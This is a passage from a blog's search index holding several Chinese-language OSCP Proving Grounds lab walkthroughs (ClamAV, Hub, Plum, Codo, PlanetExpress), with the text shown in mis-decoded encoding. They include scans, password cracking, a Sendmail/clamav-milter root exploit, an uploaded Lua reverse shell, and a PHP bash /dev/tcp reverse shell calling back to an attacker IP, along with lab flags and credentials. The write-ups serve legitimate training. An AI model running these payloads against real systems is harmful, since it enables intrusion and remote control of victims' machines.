root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7::: daemon:*:18555:0:99999:7::: bin:*:18555:0:99999:7::: sys:*:18555:0:99999:7::: sync:*:18555:0:99999:7::: games:*:18555:0:99999:7::: man:*:18555:0:99999:7::: lp:*:18555:0:99999:7::: mail:*:18555:0:99999:7::: news:*:18555:0:99999:7::: www-data@planetexpress:~$ ç ´è§£å¯†ç  â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ hashcat -m 1800 1.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ john 1.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status neverwant2saygoodbye (?) 1g 0:00:14:10 DONE (2023-12-20 02:21) 0.001176g/s 990.2p/s 990.2c/s 990.2C/s newbattle..nevada99 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. www-data@planetexpress:~/html/planetexpress$ cat /home/astro/local.txt cat /home/astro/local.txt 4c019d06769bb528fd86b118803b7ba1 www-data@planetexpress:~/html/planetexpress$ su root su root Password: neverwant2saygoodbye id uid=0(root) gid=0(root) groups=0(root) ls -l /root/ total 4 -rw------- 1 root root 33 Dec 19 11:59 proof.txt cat /root/proof.txt 43adc185281166087180042464900510 ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["é¶åœº"],"content":"ProvingGrouds ClamAV WriteUp","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["é¶åœº"],"content":"ClamAV ç¬¬8å°ï¼ŒLinuxç³»ç»Ÿï¼Œéš¾åº¦Easyï¼Œåç§° ClamAV ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["é¶åœº"],"content":"ç«¯å£æ‰«æ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.193.42 -T4 [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-17 14:18 CST Nmap scan report for 192.168.193.42 Host is up (0.16s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0) 25/tcp open smtp Sendmail 8.13.4/8.13.4/Debian-3sarge3 80/tcp open http Apache httpd 1.3.33 ((Debian GNU/Linux)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 199/tcp open smux Linux SNMP multiplexer 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds å…¨ç«¯å£æ‰«æï¼Œè¡¥å……ç«¯å£å¦‚ä¸‹ï¼š 60000/tcp open ssh OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0) æ¼æ´æƒ…å†µï¼š Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY Privilege Escalation ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["é¶åœº"],"content":"Web æ‰“å¼€80ç«¯å£ï¼Œèƒ½çœ‹åˆ°å­—ç¬¦ä¸² 01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 00110000 01100010 äºŒè¿›åˆ¶è§£ç åå°±æ˜¯ï¼š ifyoudontpwnmeuran00b ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["é¶åœº"],"content":"SMB æ¢æµ‹SMBç©ºå£ä»¤æˆåŠŸ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ crackmapexec smb 192.168.193.42 -u '' -p '' SMB 192.168.193.42 445 NONE [*] Unix (name:) (domain:) (signing:False) (SMBv1:True) SMB 192.168.193.42 445 NONE [+] \\: â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ crackmapexec smb 192.168.193.42 -u '' -p '' --shares SMB 192.168.193.42 445 NONE [*] Unix (name:) (domain:) (signing:False) (SMBv1:True) SMB 192.168.193.42 445 NONE [+] \\: SMB 192.168.193.42 445 NONE [+] Enumerated shares SMB 192.168.193.42 445 NONE Share Permissions Remark SMB 192.168.193.42 445 NONE ----- ----------- ------ SMB 192.168.193.42 445 NONE print$ Printer Drivers SMB 192.168.193.42 445 NONE IPC$ IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig) SMB 192.168.193.42 445 NONE ADMIN$ IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig) ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["é¶åœº"],"content":"SMTP â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.193.42 -T4 -p 25 --script=smtp* [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-17 14:40 CST Nmap scan report for 192.168.193.42 Host is up (0.16s latency). PORT STATE SERVICE VERSION 25/tcp open smtp Sendmail 8.13.4/8.13.4/Debian-3sarge3 | smtp-enum-users: | root | admin | administrator | webadmin | sysadmin | netadmin | guest | user | web |_ test |_smtp-open-relay: Server is an open relay (13/16 tests) | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE | smtp-commands: localhost.localdomain Hello [192.168.45.174], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP |_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use \"HELP \u003ctopic\u003e\". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info Service Info: Host: localhost.localdomain; OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds æ¼æ´æœç´¢ æœç´¢boxçš„åç§°ï¼Œæ‰¾åˆ°å†å²æ¼æ´ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ searchsploit clamav ---------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------- --------------------------------- Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Ov | linux/dos/28348.txt ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference | linux/remote/30291.txt ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow | linux/remote/4862.py ClamAV \u003c 0.102.0 - 'bytecode_vm' Code Execution | linux/local/47687.py ClamAV \u003c 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC) | multiple/dos/7330.c ClamAV Daemon 0.65 - UUEncoded Message Denial of Service | linux/dos/23667.txt ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit) | linux/remote/16924.rb ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Meta | multiple/remote/9913.rb Sendmail with clamav-milter \u003c 0.91.2 - Remote Command Execution | multiple/remote/4761.pl ---------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ---------------------------------------------------------------------- --------------------------------- Paper Title | Path ---------------------------------------------------------------------- --------------------------------- [Azerbaijan] ClamAV Bypassing | docs/azerbaijan/31685-[azerbaija ---------------------------------------------------------------------- --------------------------------- â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/8-ClamAV] â””â”€$ searchsploit -m 4761 Exploit: Sendmail with clamav-milter \u003c 0.91.2 - Remote Command Execution URL: https://www.exploit-db.com/exploits/4761 Path: /usr/share/exploitdb/exploits/multiple/remote/4761.pl Codes: CVE-2007-4560 Verified: True File Type: ASCII text Copied to: /home/xavier/Desktop/OSCP/PG_Practice/8-ClamAV/4761.pl ### black-hole.pl ### Sendmail w/ clamav-milter Remote Root Exploit ### Copyright (c) 2007 Eliteboy ######################################################## use IO::Socket; print \"Sendmail w/ clamav-milter Remote Root Exploit\\n\"; print \"Copyright (C) 2007 Eliteboy\\n\"; if ($#ARGV != 0) {print \"Give me a host to connect.\\n\";exit;} print \"Attacking $ARGV[0]...\\n\"; $sock = IO::Socket::INET-\u003enew(PeerAddr =\u003e $ARGV[0], PeerPort =\u003e '25', Proto =\u003e 'tcp'); print $sock \"ehlo you\\r\\n\"; print $sock \"mail from: \u003c\u003e\\r\\n\"; print $sock \"rcpt to: \u003cnobody+\\\"|echo '31337 stream tcp nowait root /bin/sh -i' \u003e\u003e /etc/inetd.conf\\\"@localhost\u003e\\r\\n\"; print $sock \"rcpt to: \u003cnobody+\\\"|/etc/init.d/inetd restart\\\"@","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["é¶åœº"],"content":"ProvingGrouds Hugo WriteUp","date":"2023-12-12","objectID":"/posts/provinggrounds-hub/","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds Hub WriteUp","uri":"/posts/provinggrounds-hub/"},{"categories":["é¶åœº"],"content":"ç¬¬6å°ï¼ŒLinuxç³»ç»Ÿï¼Œéš¾åº¦Easyï¼Œåç§° Hub â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP] â””â”€$ sudo nmap -n -r --min-rate=3500 -p- -sSV --script default,vuln 192.168.240.25 -T4 â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP] â””â”€$ sudo nmap -n -r --min-rate=3500 -F -sSV 192.168.240.25 -T4 ç»“æœ PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 9999/tcp open ssl/http Barracuda Embedded Web Server 9999ç«¯å£çš„httpæœåŠ¡æ˜¯ä¸ªFuguHub 8.4ï¼Œè¦è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·ï¼Œä½¿ç”¨å¦‚ä¸‹ï¼š admin@admin.com admin password 8.1ç‰ˆæœ¬æœ‰ä¸ªRCEå†å²æ¼æ´ã€‚ â”Œâ”€â”€(xavierã‰¿kali)-[~] â””â”€$ searchsploit FuguHub ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- FuguHub 8.1 - Remote Code Execution | multiple/webapps/51550.py ---------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results è¯•ä¸‹è¿˜èƒ½ä¸èƒ½ç”¨ ç”¨ç®¡ç†èº«ä»½ç™»å½•åå°ï¼Œæ ¹æ®æ¼æ´åŸç†ï¼Œé€šè¿‡Webç«¯è¿›è¡Œæ“ä½œï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œæ•°æ®åŒ…å¦‚ä¸‹ï¼› POST /fs/ HTTP/1.1 Host: 192.168.240.25:9999 Cookie: tzone=--480; z9ZAqJtI=75107ab8eed3d3b2a7d77a3e User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------427009261933411581191473311562 Content-Length: 742 Origin: https://192.168.240.25:9999 Referer: https://192.168.240.25:9999/fs/ Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close -----------------------------427009261933411581191473311562 Content-Disposition: form-data; name=\"file\"; filename=\"rev.lsp\" Content-Type: application/octet-stream \u003ch2\u003e Check ur nc listener on the port you put in \u003ch2\u003e \u003c?lsp if request:method() == \"GET\" then ?\u003e \u003c?lsp local host, port = \"192.168.45.197\", 443 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close() ?\u003e \u003c?lsp else ?\u003e Wrong request method, goodBye! \u003c?lsp end ?\u003e -----------------------------427009261933411581191473311562-- â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/6-Hub] â””â”€$ curl https://192.168.240.25:9999/rev.lsp -k â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/6-Hub] â””â”€$ nc -nlvp 443 listening on [any] 443 ... connect to [192.168.45.197] from (UNKNOWN) [192.168.240.25] 43348 id uid=0(root) gid=0(root) groups=0(root) hostname debian ipconfig ifconfig ens192: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 192.168.240.25 netmask 255.255.255.0 broadcast 192.168.240.255 inet6 fe80::250:56ff:feba:85a3 prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:50:56:ba:85:a3 txqueuelen 1000 (Ethernet) RX packets 474 bytes 59756 (58.3 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 277 bytes 69440 (67.8 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 104 bytes 9754 (9.5 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 104 bytes 9754 (9.5 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 pwd /var/www/html ls /root/ email4.txt proof.txt cat /root/proof.txt aebbd4df648371dc7572e5ed5589a98b ","date":"2023-12-12","objectID":"/posts/provinggrounds-hub/:0:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds Hub WriteUp","uri":"/posts/provinggrounds-hub/"},{"categories":["é¶åœº"],"content":"Proving Grounds Plum WriteUp","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["é¶åœº"],"content":"plum intermediate 10 ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:0:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] â””â”€$ sudo nmap -n -r --min-rate=3500 -F -sSV 192.168.196.28 [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 22:17 CST Nmap scan report for 192.168.196.28 Host is up (0.14s latency). Not shown: 98 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http Apache httpd 2.4.56 ((Debian)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:1:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["é¶åœº"],"content":"InitAccess pluxml â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] â””â”€$ searchsploit pluxml â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] â””â”€$ searchsploit -x php/webapps/18828.txt pluxml ç‰ˆæœ¬5.8.7ï¼Œsearchsploitæ— æ¼æ´ã€‚ å¼±å£ä»¤adminï¼Œadminè¿›å…¥åå°ã€‚ æ‰¾äº†ä¸‹ç½‘ä¸Šï¼Œ5.8.7æœ‰ä¸ªåå°ä¿®æ”¹é™æ€é¡µRCEï¼Œhttps://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf æè¿°å¦‚ä¸‹ï¼š ## 1 Application https://github.com/pluxml/PluXml ## 2 Introductory Remarks There is already an issue regarding a different RCE vulnerability (https://github.com/pluxml/PluXml/issues/321). In contrast to our vulnerability,said RCE only works when using the config file parameter with admin privileges,which is not possible as a moderator. ## 3 Description of the Vulnerability In the PluXml PHP blogging platform (v5.8.7), a user with the manager role can inject arbitrary PHP code that is executed on the server. As a consequence, remote code execution (RCE) becomes possible, as illustrated in this unlisted (non-public) youtube video: https://youtu.be/Gbe2UNCB0tY. ## 4 Steps to Reproduce the Exploit 1. Login with a manager account. 2. In the Administration menu, select static pages and edit one of the pages. 3. Insert PHP code with starting and closing tags \u003c?php CODE ?\u003e. 4. Save the changes and open the stored page. ## 5 Technical Description of the Vulnerability While the administrator role has the permission to edit PHP templates and, thus, can always execute arbitrary code, the manager role has no such privileges. Indeed, a manager can only edit so-called static - purely HTML-written- pages. However, in the file core/admin/statique.php and in the file core/admin/lib/class.plx.admin.php (in the function editStatique) no proper input sanitisation is done to filter PHP-opening- and closing-tags (\u003c?php and ?\u003e). As a consequence, the injected PHP code becomes executed on the server-side, even though it is integrated with HTML content. Additionally,note that an XSS-attack is also possible for a manager (proof of concept: by integrating \u003cscript\u003ealert(/xss/)\u003c/script\u003e) and hard to filter. å†™å…¥åæˆåŠŸè¾“å‡ºã€‚ å°è¯•å†™webshellï¼Œå‘ç°æ— æ³•åŠ¨æ€è§£ææ‰§è¡Œï¼Œå¯èƒ½æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œç›´æ¥å†™shellã€‚ \u003c?php echo '123\u003cbr\u003e'; system(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/192.168.45.246/9001 0\u003e\u00261'\");?\u003e å†å»åŠ è½½é¡µé¢ï¼ŒæˆåŠŸæ”¶åˆ°åå¼¹shell â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] â””â”€$ nc -nlvp 9001 listening on [any] 9001 ... connect to [192.168.45.246] from (UNKNOWN) [192.168.196.28] 52096 bash: cannot set terminal process group (784): Inappropriate ioctl for device bash: no job control in this shell www-data@plum:/var/www/html$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@plum:/var/www/html$ www-data@plum:/tmp$ cat /var/www/local.txt cat /var/www/local.txt 3eeae195eb57983b4e679071f3098211 ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:2:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["é¶åœº"],"content":"PrivE â•”â•â•â•â•â•â•â•â•â•â•â•£ Modified interesting files in the last 5mins (limit 100) /var/www/html/data/statiques/001.static-1.php /var/www/html/data/configuration/statiques.xml /var/mail/www-data /var/log/journal/c71e29ed9c494834b5aab51454fe3ee0/system.journal /var/log/messages /var/log/btmp /var/log/syslog /var/log/kern.log /var/log/daemon.log /var/log/auth.log /tmp/GCONV_PATH=./.pkexec /tmp/passwd.bak /tmp/.pkexec/gconv-modules /tmp/1.txt è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œå¯¹/var/mail/www-dataè¿™ä¸ªæœ‰è¿‡æ€€ç–‘ï¼Œä½†æ˜¯ä¸€ç›´ç”¨headï¼Œtailï¼Œgrep passçš„å½¢å¼çœ‹å¾—ï¼Œæ²¡æœ‰æ‰“å¼€çœ‹ï¼Œè¿˜æ˜¯æœ‰æƒ³å·æ‡’çš„å¿ƒã€‚ www-data@plum:/tmp$ cat /var/mail/www-data cat /var/mail/www-data From root@localhost Fri Aug 25 06:31:47 2023 Return-path: \u003croot@localhost\u003e Envelope-to: www-data@localhost Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400 Received: from root by localhost with local (Exim 4.94.2) (envelope-from \u003croot@localhost\u003e) id 1qZU6V-0000El-Pw for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400 To: www-data@localhost From: root@localhost Subject: URGENT - DDOS ATTACK\" Reply-to: root@localhost Message-Id: \u003cE1qZU6V-0000El-Pw@localhost\u003e Date: Fri, 25 Aug 2023 06:31:47 -0400 We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user: root:6s8kaZZNaZZYBMfh2YEW Thanks, Administrator From MAILER-DAEMON Mon Dec 04 10:02:09 2023 Return-path: \u003c\u003e Envelope-to: www-data@localhost Delivery-date: Mon, 04 Dec 2023 10:02:09 -0500 Received: from Debian-exim by localhost with local (Exim 4.94.2) id 1rAASX-0001gi-JO for www-data@localhost; Mon, 04 Dec 2023 10:02:09 -0500 X-Failed-Recipients: debian@localhost Auto-Submitted: auto-replied From: Mail Delivery System \u003cMailer-Daemon@localhost\u003e To: www-data@localhost References: \u003cE1rAASX-0001fo-IY@localhost\u003e Content-Type: multipart/report; report-type=delivery-status; boundary=1701702129-eximdsn-2095242606 MIME-Version: 1.0 Subject: Mail delivery failed: returning message to sender Message-Id: \u003cE1rAASX-0001gi-JO@localhost\u003e Date: Mon, 04 Dec 2023 10:02:09 -0500 --1701702129-eximdsn-2095242606 Content-type: text/plain; charset=us-ascii This message was created automatically by mail delivery software. A message that you sent could not be delivered to one or more of its recipients. This is a permanent error. The following address(es) failed: debian@localhost (generated from root@localhost) Unrouteable address --1701702129-eximdsn-2095242606 Content-type: message/delivery-status Reporting-MTA: dns; localhost Action: failed Final-Recipient: rfc822;root@localhost Status: 5.0.0 --1701702129-eximdsn-2095242606 Content-type: message/rfc822 Return-path: \u003cwww-data@localhost\u003e Received: from www-data by localhost with local (Exim 4.94.2) (envelope-from \u003cwww-data@localhost\u003e) id 1rAASX-0001fo-IY for root@localhost; Mon, 04 Dec 2023 10:02:09 -0500 To: root@localhost Auto-Submitted: auto-generated Subject: *** SECURITY information for localhost *** From: www-data \u003cwww-data@localhost\u003e Message-Id: \u003cE1rAASX-0001fo-IY@localhost\u003e Date: Mon, 04 Dec 2023 10:02:09 -0500 localhost : Dec 4 15:02:09 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list --1701702129-eximdsn-2095242606-- From MAILER-DAEMON Mon Dec 04 10:06:20 2023 Return-path: \u003c\u003e Envelope-to: www-data@localhost Delivery-date: Mon, 04 Dec 2023 10:06:20 -0500 Received: from Debian-exim by localhost with local (Exim 4.94.2) id 1rAAWa-0004Mp-Vl for www-data@localhost; Mon, 04 Dec 2023 10:06:20 -0500 X-Failed-Recipients: debian@localhost Auto-Submitted: auto-replied From: Mail Delivery System \u003cMailer-Daemon@localhost\u003e To: www-data@localhost References: \u003cE1rAAWa-0004Mm-VK@localhost\u003e Content-Type: multipart/report; report-type=delivery-status; boundary=1701702380-eximdsn-199798543 MIME-Version: 1.0 Subject: Mail delivery failed: returning message to sender Message-Id: \u003cE1rAAWa-0004Mp-Vl@localhost\u003e Date: Mon, 04 Dec 2023 10:06:20 -0500 --1701702380-eximdsn-199798543 Content-type: text/plain; charset=us-ascii This message was ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:3:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["é¶åœº"],"content":"Codo Easy 10p ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:0:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["é¶åœº"],"content":"ç«¯å£æ‰«æ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] â””â”€$ sudo nmap -n -r --min-rate=3500 -F -sSV 192.168.196.23 [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 21:22 CST Nmap scan report for 192.168.196.23 Host is up (0.13s latency). Not shown: 98 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:1:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["é¶åœº"],"content":"InitAccess ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:2:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["é¶åœº"],"content":"Webå¼±å£ä»¤ é»˜è®¤å¯†ç ï¼šadminï¼šadminç™»å½•åå° æ‰¾åˆ°å†å²æ¼æ´ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] â””â”€$ python3 50978.py -t http://192.168.196.23 -u admin -p admin -i 192.168.45.246 -n 9001 CODOFORUM V5.1 ARBITRARY FILE UPLOAD TO RCE(Authenticated) ______ _______ ____ ___ ____ ____ _____ _ ___ ____ _ _ / ___\\ \\ / / ____| |___ \\ / _ \\___ \\|___ \\ |___ // |( _ ) ___|| || | | | \\ \\ / /| _| _____ __) | | | |__) | __) |____ |_ \\| |/ _ \\___ \\| || |_ | |___ \\ V / | |__|_____/ __/| |_| / __/ / __/_____|__) | | (_) |__) |__ _| \\____| \\_/ |_____| |_____|\\___/_____|_____| |____/|_|\\___/____/ |_| Exploit found and written by: @vikaran101 [+] Login successful [*] Checking webshell status and executing... [-] Something went wrong, please try uploading the shell manually(admin panel \u003e global settings \u003e change forum logo \u003e upload and access from http://192.168.196.23/sites/default/assets/img/attachments/[file.php]) è„šæœ¬æ²¡æ‰“æˆåŠŸï¼Œæ‰‹åŠ¨æ‰“ä¸€ä¸‹ æ–‡ä»¶ä¸Šä¼ æˆåŠŸ POST /admin/index.php?page=config HTTP/1.1 Host: 192.168.196.23 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------337198322926933256222094173604 Content-Length: 3791 Origin: http://192.168.196.23 Connection: close Referer: http://192.168.196.23/admin/index.php?page=config Cookie: user_id=1; PHPSESSID=plvs2ivgu59ff61gm3qrukmgmo; cf=0 Upgrade-Insecure-Requests: 1 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"site_title\" CODOLOGIC -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"site_description\" codoforum - Enhancing your forum experience with next generation technology! -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"admin_email\" admin@codologic.com -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"default_timezone\" Europe/London -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"register_pass_min\" 8 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"num_posts_all_topics\" 30 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"num_posts_cat_topics\" 20 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"num_posts_per_topic\" 20 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_path\" assets/img/attachments -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_exts\" jpg,jpeg,png,gif,pjpeg,bmp,txt -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"forum_attachments_size\" 3 